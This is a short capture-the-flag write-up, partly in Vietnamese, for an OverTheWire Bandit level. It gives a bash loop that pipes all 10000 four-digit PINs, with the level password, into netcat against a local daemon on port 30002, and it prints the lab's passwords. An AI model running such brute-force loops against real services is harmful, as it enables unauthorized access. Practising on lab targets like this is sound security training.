# Write-up

## Đề cho
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
You do not need to create new connections each time
## Solve
Đề kêu chạy script để netcat trên 1 connection và brute-force để tìm key. Nên ta thực hiện y chang. Bài này chủ yếu tập luyện khả năng viết bash
## Script
```bash
for i in {0..9}; do
 for j in {0..9}; do
  for k in {0..9}; do
   for f in {0..9}; do 
    echo "hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv $i$j$k$f"
   done
  done
 done
done | nc localhost 30002
```
## Key
`SoHfqMOEqIX2IYKVciZxvgpR9a******`
